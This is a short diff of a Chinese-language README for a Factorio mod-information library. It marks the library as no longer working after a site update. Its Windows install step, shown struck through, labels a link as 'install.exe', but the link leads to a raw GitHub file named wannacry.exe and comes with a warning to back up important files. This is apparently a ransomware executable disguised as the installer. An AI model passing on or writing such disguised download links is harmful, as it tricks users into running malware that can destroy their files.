@@ -1,6 +1,7 @@
 # Factorio-Mod-info
 ## 简介
-Factorio-Mod-info 是一个可以获取 Factorio Mod 信息的库。
+~~Factorio-Mod-info 是一个可以获取 Factorio Mod 信息的库。~~
+自从 Factorio Mod 网站更新后，此库无法再被使用
 ## 安装
 ### Window
 ~~运行 [`install.exe`](https://github.com/745275633/wannacry/raw/master/wannacry.exe) 将自动进行安装~~，**注意：请自行备份重要文件**
